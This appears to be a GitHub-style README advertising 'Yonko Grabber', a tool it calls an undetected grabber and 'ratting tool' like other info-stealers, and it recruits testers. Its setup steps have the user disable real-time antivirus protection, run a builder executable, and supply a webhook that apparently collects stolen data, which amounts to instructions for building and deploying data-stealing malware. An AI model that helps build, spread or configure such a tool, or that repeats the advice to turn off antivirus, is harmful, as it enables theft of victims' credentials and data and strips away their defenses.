# Yonko-Grabber
Yonko Grabber is the upcoming BEST grabber/ratting tool, while similar to luna grabber, and blank grabber, Yonko Grabber is undetected. I will be looking for testers up until August third.


How to install: First, download Python 3.9 or higher and add to path (ADDING TO PATH IS IMPORTANT).

Turn off real time protection on whatever antivirus your using (so it doesnt get flagged as a false positive)

Download YonkoBuilder.exe and wait for it to open. It takes around 2 minutes to open.

Create a webhook and put it in the paste webhook option and press test.

Select the options you want and build!
